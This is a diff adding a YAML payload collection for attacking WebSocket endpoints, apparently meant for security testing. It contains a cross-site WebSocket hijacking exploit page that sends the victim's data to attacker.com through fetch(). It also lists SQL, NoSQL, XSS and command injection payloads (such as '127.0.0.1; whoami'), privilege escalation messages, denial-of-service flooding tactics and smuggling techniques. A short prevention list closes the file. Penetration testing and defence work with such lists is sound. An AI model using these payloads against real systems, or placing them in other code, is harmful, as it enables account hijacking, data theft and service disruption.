@@ -1,0 +1,106 @@
+# WebSocket Attack Payloads
+# Often overlooked but WebSockets bypass most WAFs and CSP
+
+payload_category: "websocket-attacks"
+owasp_2025: "A05"
+cwe: "CWE-1385"
+severity: "HIGH"
+
+# ===== CROSS-SITE WEBSOCKET HIJACKING (CSWSH) =====
+cswsh:
+  detection:
+    - "Check if WebSocket handshake validates Origin header"
+    - "Change Origin to attacker.com and observe if connection succeeds"
+    - "If no CSRF token required, CSWSH is likely possible"
+
+  exploit_page: |
+    <script>
+    var ws = new WebSocket('wss://target.com/ws');
+    ws.onopen = function() {
+      ws.send('{"action":"getProfile"}');
+    };
+    ws.onmessage = function(e) {
+      fetch('https://attacker.com/steal?data=' + btoa(e.data));
+    };
+    </script>
+
+# ===== INJECTION VIA WEBSOCKET =====
+injection:
+  sqli:
+    - '{"action":"search","query":"'' OR 1=1--"}'
+    - '{"action":"getUser","id":"1 UNION SELECT username,password FROM users--"}'
+
+  xss:
+    - '{"message":"<script>alert(document.cookie)</script>"}'
+    - '{"content":"<img src=x onerror=alert(1)>"}'
+
+  command_injection:
+    - '{"command":"ping","host":"127.0.0.1; whoami"}'
+    - '{"action":"execute","cmd":"test | id"}'
+
+  nosql:
+    - '{"action":"login","username":{"$ne":""},"password":{"$ne":""}}'
+
+# ===== AUTHENTICATION BYPASS =====
+auth_bypass:
+  missing_auth:
+    - "Connect to ws:// without authentication token"
+    - "Send privileged messages without prior login"
+
+  token_manipulation:
+    - "Replay another user's WebSocket auth token"
+    - "Modify JWT in WebSocket upgrade request"
+    - "Send messages after session expiry"
+
+  privilege_escalation:
+    - '{"action":"adminPanel","role":"admin"}'
+    - '{"action":"changeRole","userId":1,"role":"admin"}'
+
+# ===== DENIAL OF SERVICE =====
+dos:
+  message_flooding:
+    - "Send 10000+ messages per second"
+    - "Send very large messages (>1MB)"
+
+  connection_exhaustion:
+    - "Open 10000+ concurrent WebSocket connections"
+    - "Open connection and never send/close"
+
+# ===== INFORMATION DISCLOSURE =====
+info_disclosure:
+  subscribe_all:
+    - '{"action":"subscribe","channel":"*"}'
+    - '{"action":"subscribe","channel":"admin"}'
+    - '{"action":"subscribe","channel":"internal"}'
+    - '{"action":"subscribe","channel":"debug"}'
+
+  enumerate_actions:
+    - '{"action":"help"}'
+    - '{"action":"list"}'
+    - '{"action":"debug"}'
+    - '{"action":"__schema__"}'
+    - '{"action":"invalid_to_trigger_error"}'
+
+# ===== SMUGGLING =====
+smuggling:
+  http_to_ws:
+    - "Upgrade HTTP connection to WebSocket mid-stream"
+    - "Bypass proxy restrictions via WebSocket tunnel"
+
+  h2c_smuggling:
+    - "HTTP/2 cleartext upgrade to bypass reverse proxy"
+    - "Use h2c to reach internal services"
+
+prevention:
+  - "Validate Origin header on WebSocket handshake"
+  - "Require authentication token in first message"
+  - "Implement rate limiting on WebSocket messages"
+  - "Sanitize all WebSocket message payloads"
+  - "Use CSRF tokens for WebSocket connections"
+  - "Set message size limits"
+  - "Implement proper authorization per message type"
+
+references:
+  - "OWASP WebSocket Security"
+  - "PortSwigger: WebSocket vulnerabilities"
+  - "CWE-1385: Missing Origin Validation in WebSockets"
